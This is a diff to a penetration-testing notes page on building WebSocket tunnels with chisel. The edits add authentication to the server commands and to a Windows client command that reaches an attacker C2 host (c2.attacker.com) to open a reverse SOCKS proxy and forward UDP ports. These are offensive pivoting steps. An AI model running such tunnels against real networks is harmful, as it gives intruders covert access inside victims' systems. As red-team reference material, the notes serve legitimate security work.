@@ -7,7 +7,7 @@ title: WebSockets Tunnel
 Start an unauthenticated [[notes/tools/chisel]] server on Linux.
 
 ~~~ bash
-sudo chisel server --port 80 --socks5 --reverse
+chisel server --port 80 --socks5 --reverse --auth proxy:"$(uuidgen -r | tee /dev/stderr)"
 ~~~
 
 Alternatively start a server with authentication where the user `proxy` can bind only to unprivileged ports on localhost.
@@ -20,7 +20,7 @@ cat << 'EOF' > ./users.json
   ]
 }
 EOF
-sudo chisel server --port 80 --socks5 --reverse --authfile ./users.json
+chisel server --port 80 --socks5 --reverse --authfile ./users.json
 ~~~
 
 Connect with the client from Linux to establish a reverse [[notes/pivoting/socks-proxy]].
@@ -32,7 +32,7 @@ Connect with the client from Linux to establish a reverse [[notes/pivoting/socks
 Connect with the client from Windows to forward local port 53/udp to port 5300 on the server.
 
 ~~~ bat
-.\chisel.exe client --fingerprint %fingerprint% http://c2.attacker.com R:127.0.0.1:1080:socks 53:127.0.0.1:5300/udp
+.\chisel.exe client --fingerprint %fingerprint% --auth proxy:"passw0rd" http://c2.attacker.com R:127.0.0.1:1080:socks 53:127.0.0.1:5300/udp
 ~~~
 
 > **Note:**
